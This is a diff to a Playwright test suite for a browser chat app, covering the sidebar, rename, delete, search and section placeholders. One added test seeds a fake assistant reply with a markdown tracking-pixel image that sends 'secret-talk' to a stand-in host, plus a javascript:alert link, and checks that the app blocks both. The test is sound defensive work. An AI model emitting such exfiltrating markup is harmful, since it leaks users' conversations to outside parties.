@@ -49,6 +49,17 @@ async function sendAndWait(page, text, marker, timeout = 25000) {
   );
 }
 
+async function openSidebar(page, titlePart) {
+  const toggle = page.getByRole("button", { name: "Show conversations", exact: true });
+  if (await toggle.isVisible()) await toggle.click();
+  await page
+    .locator(".sidebar")
+    .getByRole("button", { name: new RegExp(titlePart.slice(0, 24), "i") })
+    .first()
+    .click();
+  await page.waitForTimeout(400);
+}
+
 const tests = {
   // v1 -> v2 migration: nothing lost, never repeats, old key removed.
   async migrate() {
@@ -89,8 +100,7 @@ const tests = {
     const msgs = JSON.parse(keys["crescent-chat.msgs.a.v2"] ?? "[]");
     check("migrate: payload kept", msgs.length === 1 && msgs[0].content === "hello old world");
     // Thread still opens with the migrated messages.
-    await page.getByRole("button", { name: /Show.*conversation/ }).click();
-    await page.getByRole("button", { name: "Open conversation: First" }).click();
+    await openSidebar(page, "First");
     await page.waitForTimeout(400);
     check(
       "migrate: thread shows migrated text",
@@ -136,8 +146,7 @@ const tests = {
     const p2 = await ctx.newPage();
     await p2.goto(APP);
     await p2.waitForTimeout(1000);
-    await p2.getByRole("button", { name: /Show.*conversation/ }).click();
-    check("multiwindow: p2 starts empty", (await p2.locator(".nav-point").count()) === 0);
+    check("multiwindow: p2 starts empty", (await p2.locator(".sidebar-row").count()) === 0);
     await p1.getByRole("textbox", { name: "Message" }).fill("From window one.");
     await p1.getByRole("textbox", { name: "Message" }).press("Enter");
     await p1.waitForFunction(
@@ -145,11 +154,11 @@ const tests = {
       null,
       { timeout: 20000 },
     );
-    // Reopen p2's nav: the point must be there with no reload.
-    await p2.keyboard.press("Escape");
-    await p2.getByRole("button", { name: /Show.*conversation/ }).click();
-    await p2.waitForTimeout(400);
-    check("multiwindow: p2 sees the new point", (await p2.locator(".nav-point").count()) === 1);
+    // p2's sidebar updates with no interaction and no reload.
+    await p2.waitForFunction(() => document.querySelectorAll(".sidebar-row").length === 1, null, {
+      timeout: 10000,
+    });
+    check("multiwindow: p2 sees the new row", true);
     await browser.close();
   },
 
@@ -338,13 +347,16 @@ const tests = {
       await page.getByRole("textbox", { name: "Message" }).press("Enter");
     };
     const open = async (title) => {
-      await page.getByRole("button", { name: /Show.*conversation/ }).click();
-      await page.getByRole("button", { name: `Open conversation: ${title}` }).click();
+      await page
+        .locator(".sidebar")
+        .getByRole("button", { name: new RegExp(title, "i") })
+        .first()
+        .click();
       await page.waitForTimeout(300);
     };
     await say("First topic");
     await page.waitForTimeout(800);
-    await page.getByRole("button", { name: "New chat" }).click();
+    await page.getByRole("button", { name: "+ New chat" }).click();
     await say("Second topic");
     await page.waitForTimeout(1500);
     // Both threads hold partial text: two live streams, no interference.
@@ -363,6 +375,177 @@ const tests = {
     await open("Second topic");
     const bodyB = (await page.locator(".thread").textContent()) ?? "";
     check("twostream: B stopped honestly", bodyB.includes("Stopped early"));
+    await browser.close();
+  },
+
+  // Rename: index-only, payload untouched on disk.
+  async rename() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seed(page, {
+      settings: okSettings("x"),
+      convos: [
+        {
+          id: "r1",
+          title: "Old title",
+          createdAt: 1,
+          updatedAt: 1,
+          messages: [{ id: "m1", role: "user", content: "keep me", createdAt: 1 }],
+        },
+      ],
+    });
+    await page.goto(APP);
+    await page.waitForTimeout(1200);
+    await page.locator(".sidebar-row").first().hover();
+    await page.getByRole("button", { name: "Rename" }).click();
+    await page.locator(".sidebar-rename").fill("New title");
+    await page.locator(".sidebar-rename").press("Enter");
+    await page.waitForTimeout(400);
+    const sidebar = (await page.locator(".sidebar").textContent()) ?? "";
+    check("rename: sidebar shows new title", sidebar.includes("New title"));
+    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
+    check("rename: index retitled", index[0]?.title === "New title");
+    check("rename: search follows title", (index[0]?.search ?? "").startsWith("New title"));
+    const msgs = JSON.parse((await stored(page, "crescent-chat.msgs.r1.v2")) ?? "[]");
+    check("rename: payload untouched", msgs.length === 1 && msgs[0].content === "keep me");
+    await browser.close();
+  },
+
+  // Delete: two steps in the row, index and payload both gone.
+  async deleterow() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seed(page, {
+      settings: okSettings("x"),
+      convos: [
+        {
+          id: "d1",
+          title: "Doomed",
+          createdAt: 1,
+          updatedAt: 1,
+          messages: [{ id: "m1", role: "user", content: "bye", createdAt: 1 }],
+        },
+      ],
+    });
+    await page.goto(APP);
+    await page.waitForTimeout(1200);
+    await openSidebar(page, "Doomed");
+    await page.locator(".sidebar-row").first().hover();
+    await page.getByRole("button", { name: "Delete" }).first().click();
+    await page.getByRole("button", { name: "Sure?" }).click();
+    await page.waitForTimeout(400);
+    check("delete: row gone", (await page.locator(".sidebar-row").count()) === 0);
+    check("delete: thread back to empty", (await page.locator(".empty").count()) === 1);
+    const index = JSON.parse((await stored(page, "crescent-chat.index.v2")) ?? "[]");
+    check("delete: index empty", index.length === 0);
+    check("delete: payload key gone", (await stored(page, "crescent-chat.msgs.d1.v2")) === null);
+    await browser.close();
+  },
+
+  // Search over 1000 index entries with zero payload keys on disk.
+  async search1000() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await page.addInitScript(() => {
+      localStorage.clear();
+      localStorage.setItem("crescent-chat.theme.v1", "light");
+      const index = [];
+      for (let i = 0; i < 1000; i++) {
+        const title = i === 999 ? "Quarterly taxes reckoning" : `Conversation ${i}`;
+        index.push({
+          id: `c${i}`,
+          title,
+          createdAt: i,
+          updatedAt: 100000 - i,
+          preview: `preview ${i}`,
+          search: `${title}\npreview ${i}`,
+          hasMessages: true,
+        });
+      }
+      localStorage.setItem("crescent-chat.index.v2", JSON.stringify(index));
+      localStorage.setItem("crescent-chat.migrated.v2", "1");
+    });
+    await page.goto(APP);
+    await page.waitForTimeout(1500);
+    check("search1000: rows render without payloads", (await page.locator(".sidebar-row").count()) > 10);
+    const t0 = Date.now();
+    await page.getByLabel("Search conversations").fill("taxes reckoning");
+    await page.waitForFunction(() => document.querySelectorAll(".sidebar-row").length === 1, null, {
+      timeout: 10000,
+    });
+    const ms = Date.now() - t0;
+    check("search1000: narrows to one", true, `${ms}ms`);
+    check("search1000: still no payload keys", await page.evaluate(() => {
+      for (let i = 0; i < localStorage.length; i++) {
+        if ((localStorage.key(i) ?? "").startsWith("crescent-chat.msgs.")) return false;
+      }
+      return true;
+    }));
+    await browser.close();
+  },
+
+  // The model cannot phone home: no img elements, no javascript: hrefs.
+  async imgblocked() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await seed(page, {
+      settings: okSettings("x"),
+      convos: [
+        {
+          id: "s1",
+          title: "Sneaky model",
+          createdAt: 1,
+          updatedAt: 1,
+          messages: [
+            { id: "m1", role: "user", content: "Show me a picture.", createdAt: 1 },
+            {
+              id: "m2",
+              role: "assistant",
+              content:
+                "Here:\n\n![tracker](https://tracker.example/pixel.gif?c=secret-talk)\n\nAnd [evil](javascript:alert(1)).",
+              createdAt: 2,
+            },
+          ],
+        },
+      ],
+    });
+    await page.goto(APP);
+    await page.waitForTimeout(1200);
+    await openSidebar(page, "Sneaky model");
+    check("imgblocked: zero img elements", (await page.locator(".thread img").count()) === 0);
+    check("imgblocked: notice shown", (await page.locator(".blocked-image").count()) === 1);
+    check(
+      "imgblocked: no javascript: hrefs",
+      (await page.locator('.thread a[href^="javascript"]').count()) === 0,
+    );
+    const href = await page.locator(".blocked-image a").getAttribute("href");
+    check("imgblocked: address openable by hand", href === "https://tracker.example/pixel.gif?c=secret-talk");
+    let external = 0;
+    page.on("request", (req) => {
+      if (!req.url().startsWith("http://localhost:5173")) external++;
+    });
+    await page.reload();
+    await page.waitForTimeout(1500);
+    check("imgblocked: zero external requests", external === 0, `${external} seen`);
+    await browser.close();
+  },
+
+  // The crescent carries six surfaces and nothing else.
+  async surfaces() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seed(page, { settings: okSettings("x") });
+    await page.goto(APP);
+    await page.waitForTimeout(1200);
+    await page.getByRole("button", { name: /Show sections/ }).click();
+    await page.waitForTimeout(500);
+    check("surfaces: six points", (await page.locator(".crescent-nav .nav-point").count()) === 6);
+    check("surfaces: no paging arrows", (await page.locator(".crescent-page-arrow").count()) === 0);
+    await page.getByRole("button", { name: "Open Models" }).click();
+    await page.waitForTimeout(400);
+    const body = (await page.locator(".stage").textContent()) ?? "";
+    check("surfaces: honest placeholder", body.includes("Model choice will live here"));
+    check("surfaces: no fake controls", (await page.locator(".stage button").count()) === 0);
     await browser.close();
   },
   async silent() {
@@ -397,9 +580,7 @@ const tests = {
     });
     await page.goto(APP);
     await page.waitForTimeout(1200);
-    await page.getByRole("button", { name: /Show.*conversation/ }).click();
-    await page.getByRole("button", { name: /Open conversation/ }).first().click();
-    await page.waitForTimeout(400);
+    await openSidebar(page, "Damaged");
     const body = await page.locator(".thread").textContent();
     check("corrupt: valid message renders", body.includes("I survive."));
     check("corrupt: no error boundary", (await page.locator(".error-boundary").count()) === 0);
